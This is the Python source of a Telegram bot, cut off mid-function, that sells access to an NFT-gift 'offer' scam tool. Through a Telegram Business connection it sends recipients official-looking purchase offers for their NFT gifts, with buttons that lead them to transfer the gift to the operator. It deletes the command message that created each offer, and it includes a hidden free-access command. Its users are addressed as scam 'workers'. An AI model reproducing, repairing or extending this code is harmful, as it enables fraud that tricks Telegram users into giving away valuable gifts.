import asyncio
import logging
import random
import secrets
import aiohttp
from datetime import datetime, timezone

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,
                           LinkPreviewOptions, Message, BusinessConnection)

from config import load_config
from database import Database
from translations import t, get_user_locale
from offer import (ACCEPT_EMOJI_ID, DECLINE_EMOJI_ID, GIFT_EMOJI_ID, TRANSFER_EMOJI_ID, CONFIRM_EMOJI_ID,
                   display_amount, format_remaining, gift_title, make_expiry, parse_offer)
from bot_manager import BotManager

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offerbot")

cfg = load_config()
db = Database(cfg.database_path)
storage = MemoryStorage()
bot = Bot(cfg.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)
offer_locks = {}
bot_manager = BotManager(db, cfg)  # Менеджер клиентских ботов

# Константы для канала
REQUIRED_CHANNEL_ID = -1004393569613
REQUIRED_CHANNEL_URL = "https://t.me/dodep222"


# Состояния для рассылки
class BroadcastStates(StatesGroup):
    waiting_for_message = State()


# Состояния для добавления бота
class AddBotStates(StatesGroup):
    waiting_for_token = State()


async def check_channel_subscription(user_id: int) -> bool:
    """Проверяет подписан ли пользователь на канал"""
    try:
        member = await bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        log.error(f"Error checking subscription: {e}")
        return False


def display_name(user) -> str:
    return " ".join(x for x in [getattr(user, 'first_name', None), getattr(user, 'last_name', None)] if x) or "Пользователь"


def full_instruction():
    """Полная инструкция по использованию бота"""
    return (
        "<b>📖 Инструкция</b>\n\n"
        "<b>1. Подключение Telegram Business</b>\n"
        "Подключите этого бота к своему Business аккаунту через настройки Telegram\n\n"
        "<b>2. Отправка оферов</b>\n"
        "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
        "<code>купить https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
        "<code>купить https://t.me/nft/PartySparkler-140864 2000 р</code>\n\n"
        "<b>3. Языки оферов</b>\n"
        "Добавьте код языка в конец команды:\n"
        "<code>купить https://t.me/nft/... 500 грам англ</code>\n"
        "<code>купить https://t.me/nft/... 500 грам араб</code>\n"
        "<code>купить https://t.me/nft/... 500 грам китай</code>\n\n"
        "<b>4. Настройка профиля передачи</b>\n"
        "<code>/transfer @username</code>\n"
        "Меняет профиль в кнопке \"Передать\"\n\n"
        "<b>5. Свой бот</b>\n"
        "Вы можете добавить своего бота:\n"
        "<code>/mybots</code> — управление ботами\n"
        "<code>/addbot</code> — добавить нового бота\n\n"
        "Создайте бота через @BotFather, добавьте токен сюда, подключите к нему Business — всё работает!\n\n"
        "<blockquote>При заморозке аккаунта, напишите овнеру @witensea для переноса доступа.</blockquote>"
    )


def short_instruction():
    """Краткая инструкция для ошибок"""
    return (
        "<b>Использование</b>\n"
        "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
        "<code>купить https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
        "<code>купить https://t.me/nft/PartySparkler-140864 2000 р</code>"
    )


def error_text(kind):
    if kind == "nft": return "❌ Не нашёл ссылку на NFT.\n\n" + short_instruction()
    if kind == "price": return "❌ Не нашёл цену офера.\n\n" + short_instruction()
    return "❌ Не удалось обработать офер."


def offer_keyboard(offer_id: int, locale: str):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t("btn_decline", locale), icon_custom_emoji_id=DECLINE_EMOJI_ID, callback_data=f"of:decline:{offer_id}"),
        InlineKeyboardButton(text=t("btn_accept", locale), icon_custom_emoji_id=ACCEPT_EMOJI_ID, callback_data=f"of:accept:{offer_id}"),
    ]])


def transfer_keyboard(url: str, locale: str, offer_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=t("btn_transfer", locale),
            icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)],
        [InlineKeyboardButton(
            text=t("btn_confirm", locale),
            icon_custom_emoji_id=GIFT_EMOJI_ID,
            callback_data=f"of:confirm:{offer_id}")]
    ])


async def check_ton_payment(wallet: str, memo: str, amount: float, min_confirmations: int = 1) -> bool:
    """Проверяет наличие транзакции с указанным memo в TON блокчейне
    
    Args:
        wallet: Адрес кошелька в любом формате (raw/user-friendly)
        memo: Комментарий транзакции для поиска
        amount: Ожидаемая сумма в TON (Gram)
        min_confirmations: Минимальное количество подтверждений (по умолчанию 1)
    
    Returns:
        True если транзакция найдена и подтверждена
    """
    try:
        # TON Center API v2
        api_url = "https://toncenter.com/api/v2/getTransactions"
        
        async with aiohttp.ClientSession() as session:
            params = {
                "address": wallet,
                "limit": 20,  # Проверяем последние 20 транзакций
            }
            
            async with session.get(api_url, params=params) as resp:
                if resp.status != 200:
                    log.error("TON API error: %s", resp.status)
                    return False
                
                data = await resp.json()
                
                if not data.get("ok"):
                    log.error("TON API returned not ok: %s", data)
                    return False
                
                transactions = data.get("result", [])
                
                for tx in transactions:
                    # Проверяем входящие сообщения
                    in_msg = tx.get("in_msg", {})
                    if not in_msg:
                        continue
                    
                    # Проверяем комментарий (message)
                    message = in_msg.get("message", "")
                    
                    # Декодируем base64 если нужно
                    if isinstance(message, str) and message:
                        try:
                            # Пробуем декодировать из base64
                            import base64
                            decoded = base64.b64decode(message).decode('utf-8', errors='ignore')
                            # Убираем служебные символы (первые 4 байта обычно это opcode)
                            if len(decoded) > 4:
                                decoded = decoded[4:]
                            message = decoded
                        except:
                            pass
                    
                    # Проверяем совпадение memo (без учета регистра)
                    if message.strip().upper() != memo.strip().upper():
                        continue
                    
                    # Проверяем сумму (в nanoTON, 1 TON = 1_000_000_000 nanoTON)
                    tx_value = int(in_msg.get("value", 0))
                    expected_value = int(amount * 1_000_000_000)
                    
                    # Проверяем что сумма >= ожидаемой (с погрешностью в 1%)
                    if tx_value >= expected_value * 0.99:
                        log.info("Found matching transaction: memo=%s amount=%s", memo, tx_value / 1_000_000_000)
                        return True
                
                return False
                
    except Exception as e:
        log.error("Error checking TON payment: %s", e)
        return False


async def safe_send_business(connection_id, chat_id, **kwargs):
    """Send one Business message with retry logic for TelegramRetryAfter."""
    last_exc = None
    for attempt in range(6):
        try:
            return await bot.send_message(chat_id=chat_id, business_connection_id=connection_id, **kwargs)
        except TelegramRetryAfter as e:
            last_exc = e
            if attempt >= 5:
                break
            await asyncio.sleep(e.retry_after + random.uniform(0.1, 0.4))
    raise last_exc


async def get_connection(connection_id: str):
    row = db.get_business_connection(connection_id)
    if row and row["is_enabled"]:
        return row
    try:
        bc = await bot.get_business_connection(connection_id)
        db.upsert_business_connection(connection_id, bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name, bc.is_enabled)
        log.info("BUSINESS CONNECTION RESTORED connection_id=%s owner_id=%s", connection_id, bc.user.id)
        return db.get_business_connection(connection_id)
    except Exception as e:
        log.error("BUSINESS CONNECTION FAILED connection_id=%s error=%s", connection_id, e)
        return None


async def process_offer(message: Message, business_connection_id: str | None = None):
    text = message.text or message.caption or ""
    parsed = parse_offer(text)
    if text.strip().lower() in {"купить", "buy"}:
        await reply_message(message, full_instruction())
        return
    if parsed.get("error"):
        await reply_message(message, error_text(parsed["error"]))
        return

    sender = message.from_user
    if not sender:
        await reply_message(message, "❌ Не удалось определить отправителя.")
        return

    if business_connection_id:
        bc = await get_connection(business_connection_id)
        if not bc or not bc["is_enabled"]:
            await reply_message(message, "❌ Для офера сначала подключите Telegram Business к этому боту.")
            return
        seller_id = bc["user_id"]
        buyer_id = message.chat.id
        seller_username = bc["username"]
        buyer_username = sender.username
        buyer_url = f"tg://user?id={buyer_id}"
        if db.is_blocked(seller_id) or int(bc["is_blocked"]):
            await reply_message(message, t("no_access", "ru"))
            return
        if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
            await reply_message(message, t("no_access", "ru"))
            return
    else:
        seller_id = sender.id
        bc = db.get_connection_for_user(seller_id)
        if not bc:
            await reply_message(message, "❌ Для офера сначала подключите Telegram Business к этому боту.")
            return
        if db.is_blocked(seller_id) or int(bc["is_blocked"]):
            await reply_message(message, t("no_access", "ru"))
            return
        if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
            await reply_message(message, t("no_access", "ru"))
            return
        buyer_id = message.chat.id
        buyer_username = message.chat.username if message.chat else None
        buyer_url = f"tg://user?id={buyer_id}"
        seller_username = bc["username"]
        business_connection_id = bc["connection_id"]

    profile = db.get_profile(seller_id)
    transfer_username = profile["name"] if profile and profile["name"] else seller_username
    transfer_url = (f"tg://send_gift?to={transfer_username.lstrip('@')}" if transfer_username else f"tg://user?id={seller_id}")
    now = datetime.now(timezone.utc)
    expires = make_expiry(now, cfg.offer_expire_hours)
    data = dict(seller_id=seller_id, seller_username=seller_username, buyer_id=buyer_id,
                buyer_username=buyer_username, buyer_url=buyer_url, gift_name=parsed["gift_name"],
                gift_number=parsed["gift_number"], gift_url=parsed["gift_url"], amount=parsed["amount"],
                currency=parsed["currency"], locale=parsed["locale"], status="pending",
                created_at=now.isoformat(), expires_at=expires.isoformat(), message_chat_id=None,
                message_id=None, business_connection_id=business_connection_id, transfer_url=transfer_url)
    offer_id = db.create_offer(data)
    log.info("[OFFER CREATE] offer_id=%s seller_id=%s buyer_id=%s business_connection_id=%s gift=%s gift_number=%s amount=%s currency=%s",
             offer_id, seller_id, buyer_id, business_connection_id, parsed["gift_name"], parsed["gift_number"], parsed["amount"], parsed["currency"])

    seller_name = " ".join(x for x in [bc["first_name"], bc["last_name"]] if x) or t("offer_seller", parsed["locale"])
    title = gift_title(parsed["gift_name"], parsed["gift_number"])
    amount = display_amount(parsed["amount"], parsed["currency"])
    remaining = format_remaining((expires - now).total_seconds())
    
    # Формируем текст офера с учётом языка
    body = f"{t('offer_seller', parsed['locale'])} <b>{seller_name}</b> {t('offer_text', parsed['locale'], amount=amount)} <a href=\"{parsed['gift_url']}\">{title}</a>.\n\n{t('offer_expired', parsed['locale'], time=remaining)}"
    
    try:
        sent = await safe_send_business(business_connection_id, buyer_id, text=body,
            reply_markup=offer_keyboard(offer_id, parsed["locale"]),
            link_preview_options=LinkPreviewOptions(url=parsed["gift_url"], show_above_text=True))
    except Exception as e:
        log.exception("[OFFER SEND] offer_id=%s chat_id=%s business_connection_id=%s error=%s", offer_id, buyer_id, business_connection_id, e)
        db.delete_offer(offer_id)
        await reply_message(message, "❌ Не удалось отправить офер. Попробуйте ещё раз позже.")
        return
    db.set_offer_message(offer_id, buyer_id, sent.message_id)
    log.info("[OFFER SEND] offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
    await delete_source(message, business_connection_id)


async def reply_message(message: Message, text: str):
    try:
        if message.business_connection_id:
            await bot.send_message(chat_id=message.chat.id, business_connection_id=message.business_connection_id, text=text)
        else:
            await message.answer(text)
    except Exception:
        log.exception("Failed to reply to message")


async def delete_source(message: Message, connection_id: str | None):
    try:
        if connection_id:
            await bot.delete_business_messages(business_connection_id=connection_id, message_ids=[message.message_id])
        else:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception as e:
        log.warning("Could not delete source message: %s", e)


@dp.message(Command("start"))
async def on_start(message: Message):
    if not message.from_user:
        return
    
    locale = get_user_locale(message)
    
    # Проверка подписки на канал
    is_subscribed = await check_channel_subscription(message.from_user.id)
    
    if not is_subscribed:
        # Если не подписан - показываем кнопку подписки
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=t("btn_subscribe", locale), url=REQUIRED_CHANNEL_URL)
        ], [
            InlineKeyboardButton(text=t("btn_subscribed", locale), callback_data="check_subscription")
        ]])
        try:
            if message.business_connection_id:
                await bot.send_message(
                    chat_id=message.chat.id, 
                    business_connection_id=message.business_connection_id,
                    text=t("subscribe_first", locale),
                    reply_markup=kb
                )
            else:
                await message.answer(
                    t("subscribe_first", locale),
                    reply_markup=kb
                )
        except Exception:
            log.exception("Failed to send subscription request")
        return
    
    # Если подписан - показываем главное меню
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t("btn_buy_access", locale), callback_data="buy_access"),
        InlineKeyboardButton(text=t("btn_instruction", locale), callback_data="show_instruction")
    ]])
    try:
        if message.business_connection_id:
            await bot.send_message(
                chat_id=message.chat.id, 
                business_connection_id=message.business_connection_id,
                text=t("welcome", locale),
                reply_markup=kb
            )
        else:
            await message.answer(
                t("welcome", locale),
                reply_markup=kb
            )
    except Exception:
        log.exception("Failed to send start message")


@dp.business_connection()
async def on_business_connection(bc: BusinessConnection):
    db.upsert_business_connection(bc.id, bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name, bc.is_enabled)
    log.info("Business connection id=%s user_id=%s enabled=%s", bc.id, bc.user.id, bc.is_enabled)
    
    # Уведомляем овнера только при подключении (не при отключении)
    if bc.is_enabled and bc.user.id != cfg.owner_id:
        if bc.user.id in cfg.offer_always_allowed_ids:
            db.add_access(bc.user.id); db.unblock_offer_user(bc.user.id); db.set_connection_blocked(bc.id, False)
            state = "🟢 Разрешено"
        else:
            state = "⛔ Оферы пока заблокированы."
        try:
            await bot.send_message(cfg.owner_id, f"🔔 Новое Business-подключение\n\n👤 {display_name(bc.user)}\n🆔 <code>{bc.user.id}</code>\n🔗 @{bc.user.username or 'нет'}\n\n{state}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="🟢 Разрешить", callback_data=f"adm:allow:{bc.user.id}"),
                    InlineKeyboardButton(text="🔴 Заблокировать", callback_data=f"adm:block:{bc.user.id}")]]))
        except Exception:
            log.exception("Failed to notify owner")


@dp.business_message()
async def on_business_message(message: Message, state: FSMContext):
    if cfg.business_debug:
        log.info("[BUSINESS] connection_id=%s from_user_id=%s from_username=%s chat_id=%s text=%s",
                 message.business_connection_id, message.from_user.id if message.from_user else None,
                 message.from_user.username if message.from_user else None, message.chat.id, message.text or message.caption)
    await handle_text(message, True, state)


@dp.message()
async def on_message(message: Message, state: FSMContext):
    await handle_text(message, False, state)


async def handle_text(message: Message, is_business: bool, state: FSMContext = None):
    text = (message.text or "").strip()
    low = text.lower()
    
    # Секретная команда для бесплатной выдачи доступа
    if low == "/codeoffer free":
        if not message.from_user:
            return
        db.add_access(message.from_user.id)
        db.unblock_offer_user(message.from_user.id)
        await reply_message(message, "✅ Доступ к оферам выдан!")
        return
    
    # Команда для рассылки (только для овнера)
    if low == "/broadcast" and message.from_user and message.from_user.id == cfg.owner_id:
        if state:
            await start_broadcast(message, state)
        else:
            await reply_message(message, "❌ State не доступен для рассылки")
        return
    
    # Команды для управления ботами
    if low == "/mybots" or low == "/мои_боты":
        if message.from_user:
            await show_my_bots(message)
        return
    
    if low == "/addbot" or low == "/добавить_бота":
        if message.from_user:
            if state:
                await start_add_bot(message, state)
            else:
                await reply_message(message, "❌ State не доступен")
        return
    
    # Админские команды для управления всеми ботами
    if low == "/botlist" and message.from_user and message.from_user.id == cfg.owner_id:
        await show_all_bots(message)
        return
    
    if low.startswith("/stopbot ") and message.from_user and message.from_user.id == cfg.owner_id:
        try:
            bot_id = int(text.split()[1])
            success, msg = await bot_manager.stop_bot(bot_id)
            await reply_message(message, f"{'✅' if success else '❌'} {msg}")
        except (ValueError, IndexError):
            await reply_message(message, "❌ Использование: /stopbot [ID]")
        return
    
    if low.startswith("/startbot ") and message.from_user and message.from_user.id == cfg.owner_id:
        try:
            bot_id = int(text.split()[1])
            bot_data = db.get_client_bot(bot_id)
            if bot_data:
                success, msg = await bot_manager.start_bot(bot_id, bot_data["token"], bot_data["owner_id"])
                await reply_message(message, f"{'✅' if success else '❌'} {msg}")
            else:
                await reply_message(message, "❌ Бот не найден")
        except (ValueError, IndexError):
            await reply_message(message, "❌ Использование: /startbot [ID]")
        return
    
    if low.startswith("/deletebot ") and message.from_user and message.from_user.id == cfg.owner_id:
        try:
            bot_id = int(text.split()[1])
            await bot_manager.stop_bot(bot_id)
            db.delete_client_bot(bot_id)
            await reply_message(message, "✅ Бот удалён")
        except (ValueError, IndexError):
            await reply_message(message, "❌ Использование: /deletebot [ID]")
        return
    
    if low == ".привет" or low == "привет":
        await reply_message(message, "Привет")
        return
    if low == ".бизнестест":
        if is_business:
            await reply_message(message, f"✅ Business-сообщение дошло до бота.\n\nConnection:\n<code>{message.business_connection_id}</code>\n\nUser ID:\n<code>{message.from_user.id if message.from_user else '—'}</code>\n\nChat ID:\n<code>{message.chat.id}</code>")
        else:
            await reply_message(message, "❌ Эта команда предназначена для Business-чата.")
        return
    # Поддерживаем команду "купить"
    if low.startswith("купить ") or low.startswith("buy "):
        await process_offer(message, message.business_connection_id if is_business else None)
        return
    
    # Проверка на токен бота (прямая отправка без /addbot)
    if ":" in text and len(text) > 40 and text.split(":")[0].isdigit():
        await handle_bot_token_direct(message)
        return
    if low.startswith("/admin") or low.startswith("/админ"):
        await admin_command(message)
        return
    if low.startswith("/transfer ") or low.startswith("/передача "):
        await set_transfer(message, text.split(maxsplit=1)[1].strip())
        return
    if low.startswith("/allow ") and message.from_user and message.from_user.id == cfg.owner_id:
        target = text.split(maxsplit=1)[1].strip()
        if target.startswith("@"):
            # Поиск по юзернейму
            username = target.lstrip("@")
            user_id = db.get_user_id_by_username(username)
            if user_id:
                await admin_allow(user_id)
                await reply_message(message, f"🟢 Доступ выдан @{username}")
            else:
                await reply_message(message, f"❌ Пользователь @{username} не найден в базе")
        else:
            await admin_allow(int(target))
            await reply_message(message, "🟢 Доступ выдан.")
        return
    if low.startswith("/block ") and message.from_user and message.from_user.id == cfg.owner_id:
        target = text.split(maxsplit=1)[1].strip()
        if target.startswith("@"):
            username = target.lstrip("@")
            user_id = db.get_user_id_by_username(username)
            if user_id:
                await admin_block(user_id)
                await reply_message(message, f"🔴 @{username} заблокирован.")
            else:
                await reply_message(message, f"❌ Пользователь @{username} не найден в базе")
        else:
            await admin_block(int(target))
            await reply_message(message, "🔴 Пользователь заблокирован.")
        return
    if low.startswith("/unblock ") and message.from_user and message.from_user.id == cfg.owner_id:
        target = text.split(maxsplit=1)[1].strip()
        if target.startswith("@"):
            username = target.lstrip("@")
            user_id = db.get_user_id_by_username(username)
            if user_id:
                db.unblock_offer_user(user_id)
                await reply_message(message, f"🟢 Блокировка @{username} снята.")
            else:
                await reply_message(message, f"❌ Пользователь @{username} не найден в базе")
        else:
            uid=int(target)
            db.unblock_offer_user(uid)
            await reply_message(message, "🟢 Блокировка снята.")
        return


async def set_transfer(message: Message, username: str):
    if not message.from_user:
        return
    if not db.get_connection_for_user(message.from_user.id):
        await reply_message(message, "❌ Сначала подключите Telegram Business к этому боту.")
        return
    username = username.lstrip("@")
    db.set_profile(message.from_user.id, username, f"tg://send_gift?to={username}")
    await reply_message(message, f"✅ Transfer target сохранён: @{username}")


async def admin_allow(uid: int):
    db.add_access(uid); db.unblock_offer_user(uid)
    for row in db.list_connections():
        if row["user_id"] == uid: db.set_connection_blocked(row["connection_id"], False)

async def admin_block(uid: int):
    db.block_offer_user(uid)
    for row in db.list_connections():
        if row["user_id"] == uid: db.set_connection_blocked(row["connection_id"], True)

async def start_broadcast(message: Message, state: FSMContext):
    """Начало рассылки"""
    users = db.get_all_users()
    await state.set_state(BroadcastStates.waiting_for_message)
    await state.update_data(initiator_id=message.from_user.id)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_broadcast")
    ]])
    
    text = (f"📢 <b>Режим рассылки</b>\n\n"
            f"Всего пользователей: {len(users)}\n\n"
            f"Отправьте сообщение которое хотите разослать.\n"
            f"Можно отправлять:\n"
            f"• Текст (с <b>жирным</b>, <i>курсивом</i>)\n"
            f"• Фото с подписью\n"
            f"• Видео с подписью\n"
            f"• Документы\n"
            f"• Цитаты (blockquote)\n\n"
            f"Сообщение будет отправлено всем пользователям бота.")
    
    await message.answer(text, reply_markup=kb)


@dp.message(BroadcastStates.waiting_for_message)
async def process_broadcast_message(message: Message, state: FSMContext):
    """Обработка сообщения для рассылки"""
    if not message.from_user or message.from_user.id != cfg.owner_id:
        await state.clear()
        return
    
    users = db.get_all_users()
    
    # Подтверждение
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Отправить всем", callback_data="confirm_broadcast"),
        InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_broadcast")
    ]])
    
    await state.update_data(message_to_copy=message.message_id, chat_id=message.chat.id)
    
    await message.answer(
        f"📊 Готово к отправке!\n\n"
        f"Получателей: {len(users)}\n\n"
        f"Подтвердите рассылку:",
        reply_markup=kb)


@dp.callback_query(F.data == "confirm_broadcast")
async def confirm_broadcast_callback(call: CallbackQuery, state: FSMContext):
    """Подтверждение и выполнение рассылки"""
    if not call.from_user or call.from_user.id != cfg.owner_id:
        await call.answer("Доступ запрещён", show_alert=True)
        return
    
    data = await state.get_data()
    message_id = data.get("message_to_copy")
    chat_id = data.get("chat_id")
    
    if not message_id or not chat_id:
        await call.answer("Ошибка: сообщение не найдено", show_alert=True)
        await state.clear()
        return
    
    users = db.get_all_users()
    
    await call.message.edit_text("📤 Начинаю рассылку...")
    
    success = 0
    failed = 0
    blocked = 0
    
    for user in users:
        try:
            await bot.copy_message(
                chat_id=user["user_id"],
                from_chat_id=chat_id,
                message_id=message_id
            )
            success += 1
            await asyncio.sleep(0.05)  # Небольшая задержка между отправками
        except TelegramForbiddenError:
            blocked += 1
        except Exception as e:
            failed += 1
            log.error(f"Broadcast error for user {user['user_id']}: {e}")
    
    result_text = (
        f"✅ <b>Рассылка завершена!</b>\n\n"
        f"📊 Статистика:\n"
        f"✅ Успешно: {success}\n"
        f"🚫 Заблокировали: {blocked}\n"
        f"❌ Ошибки: {failed}\n"
        f"📨 Всего: {len(users)}"
    )
    
    await call.message.edit_text(result_text)
    await state.clear()
    await call.answer("Готово!")


@dp.callback_query(F.data == "cancel_broadcast")
async def cancel_broadcast_callback(call: CallbackQuery, state: FSMContext):
    """Отмена рассылки"""
    await state.clear()
    await call.message.edit_text("❌ Рассылка отменена.")
    await call.answer()


async def admin_command(message: Message):
    if not message.from_user or message.from_user.id != cfg.owner_id:
        await reply_message(message, "❌ Доступ запрещён."); return
    stats = db.stats()
    users_count = len(db.get_all_users())
    text = ("<b>Админка OfferBot</b>\n\n"
            "🎁 Доступ к оферам\n"
            "/allow ID — выдать доступ\n"
            "/allow @username — выдать доступ по юзернейму\n"
            "/block ID — заблокировать\n"
            "/block @username — заблокировать по юзернейму\n"
            "/unblock ID — снять блокировку\n"
            "/unblock @username — снять блокировку по юзернейму\n\n"
            "📢 Рассылка\n"
            "/broadcast — запустить рассылку\n\n"
            "🤖 Управление ботами\n"
            "/botlist — список всех клиентских ботов\n"
            "/startbot [id] — запустить бота\n"
            "/stopbot [id] — остановить бота\n"
            "/deletebot [id] — удалить бота\n\n"
            "/transfer username — сохранить transfer target для своего профиля\n\n"
            f"📊 Статистика:\n"
            f"Пользователей: {users_count}\n"
            f"Оферов: pending={stats.get('pending',0)}, accepted={stats.get('accepted',0)}, declined={stats.get('declined',0)}")
    rows=[]
    for r in db.list_connections()[:20]:
        rows.append([InlineKeyboardButton(text=f"🟢 {r['first_name'] or ''} {r['user_id']}", callback_data=f"adm:allow:{r['user_id']}"),
                     InlineKeyboardButton(text="🔴", callback_data=f"adm:block:{r['user_id']}")])
    await reply_message(message, text)
    if rows:
        await bot.send_message(message.chat.id, "Подключённые Business-профили:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@dp.callback_query(F.data == "check_subscription")
async def check_subscription_callback(call: CallbackQuery):
    """Проверка подписки после нажатия кнопки"""
    if not call.from_user:
        await call.answer("Ошибка")
        return
    
    locale = get_user_locale(call.message)
    is_subscribed = await check_channel_subscription(call.from_user.id)
    
    if not is_subscribed:
        await call.answer(t("not_subscribed", locale), show_alert=True)
        return
    
    # Показываем главное меню
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t("btn_buy_access", locale), callback_data="buy_access"),
        InlineKeyboardButton(text=t("btn_instruction", locale), callback_data="show_instruction")
    ]])
    
    try:
        await call.message.edit_text(
            t("welcome", locale),
            reply_markup=kb
        )
    except:
        await call.message.answer(
            t("welcome", locale),
            reply_markup=kb
        )
    await call.answer(t("subscribed_ok", locale))


@dp.callback_query(F.data == "show_instruction")
async def show_instruction_callback(call: CallbackQuery):
    """Показать инструкцию"""
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="« Назад", callback_data="back_to_start")
    ]])
    
    try:
        await call.message.edit_text(full_instruction(), reply_markup=kb)
    except:
        await call.message.answer(full_instruction(), reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data == "buy_access")
async def buy_access_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Ошибка")
        return
    
    # Проверяем, есть ли уже доступ
    if db.has_access(call.from_user.id, cfg.owner_id, cfg.offer_access_mode):
        await call.answer("✅ У вас уже есть доступ к оферам!", show_alert=True)
        return
    
    text = f"Доступ к оферам стоит <b>{cfg.payment_amount:g} Grаm</b>.\n\nПри блоке акка доступ можно перенести через овнера - @witensea"
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="💎 Купить имбу", callback_data="create_payment")
    ], [
        InlineKeyboardButton(text="« Назад", callback_data="back_to_start")
    ]])
    
    try:
        await call.message.edit_text(text, reply_markup=kb)
    except:
        await call.message.answer(text, reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data == "back_to_start")
async def back_to_start_callback(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="💳 Купить доступ", callback_data="buy_access"),
        InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")
    ]])
    try:
        await call.message.edit_text("<b>Привет лютый воркер телеграмма по нфт!</b>", reply_markup=kb)
    except:
        await call.message.answer("<b>Привет лютый воркер телеграмма по нфт!</b>", reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data == "create_payment")
async def create_payment_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Ошибка")
        return
    
    if not cfg.ton_wallet:
        await call.answer("⚠️ Платежи временно недоступны", show_alert=True)
        return
    
    # Генерируем уникальный memo
    memo = secrets.token_hex(8).upper()
    
    # Создаём платёж в БД
    payment_id = db.create_payment(call.from_user.id, memo, cfg.payment_amount)
    
    # Формируем deeplink для TonKeeper
    amount_nano = int(cfg.payment_amount * 1_000_000_000)  # конвертируем в nanoTON
    tonkeeper_url = f"https://app.tonkeeper.com/transfer/{cfg.ton_wallet}?amount={amount_nano}&text={memo}"
    
    text = (f"💎 <b>Оплата доступа</b>\n\n"
            f"Сумма: <b>{cfg.payment_amount:g} Grаm</b>\n"
            f"Кошелёк: <code>{cfg.ton_wallet}</code>\n\n"
            f"⚠️ <b>ВАЖНО!</b> При отправке укажите комментарий (memo):\n"
            f"<code>{memo}</code>\n\n"
            f"Без memo платёж не будет засчитан!")
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="💎 Открыть TonKeeper", url=tonkeeper_url)
    ], [
        InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_payment:{memo}")
    ], [
        InlineKeyboardButton(text="« Назад", callback_data="buy_access")
    ]])
    
    try:
        await call.message.edit_text(text, reply_markup=kb)
    except:
        await call.message.answer(text, reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data.startswith("check_payment:"))
async def check_payment_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Ошибка")
        return
    
    memo = call.data.split(":", 1)[1]
    payment = db.get_payment_by_memo(memo)
    
    if not payment:
        await call.answer("❌ Платёж не найден", show_alert=True)
        return
    
    if payment["user_id"] != call.from_user.id:
        await call.answer("❌ Это не ваш платёж", show_alert=True)
        return
    
    if payment["status"] == "paid":
        await call.answer("✅ Платёж уже обработан", show_alert=True)
        return
    
    # Проверяем транзакцию в блокчейне
    await call.answer("⏳ Проверяю блокчейн...")
    
    if not cfg.ton_wallet:
        await call.answer("⚠️ Кошелёк не настроен", show_alert=True)
        return
    
    # Проверяем наличие транзакции
    is_paid = await check_ton_payment(cfg.ton_wallet, memo, payment["amount"])
    
    if is_paid:
        # Подтверждаем оплату
        db.mark_payment_paid(payment["id"])
        db.add_access(call.from_user.id)
        db.unblock_offer_user(call.from_user.id)
        
        # Отправляем приветственное сообщение
        success_text = ("✅ <b>Спасибо за покупку, удачного ворка!</b>\n\n"
                       "<b>Инструкция:</b>\n"
                       "<code>купить [ссылка нфт] [кол-во] зв/грам/р</code>\n\n"
                       "Пример:\n"
                       "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>")
        
        try:
            await call.message.edit_text(success_text)
        except:
            await call.message.answer(success_text)
        
        # Уведомляем овнера
        try:
            await bot.send_message(cfg.owner_id, 
                f"✅ Автоматически подтверждён платёж\n\n"
                f"Пользователь: {display_name(call.from_user)}\n"
                f"ID: <code>{call.from_user.id}</code>\n"
                f"Memo: <code>{memo}</code>\n"
                f"Сумма: {payment['amount']:g} Grаm")
        except:
            pass
        
        await call.answer("✅ Оплата подтверждена! Доступ выдан.", show_alert=True)
    else:
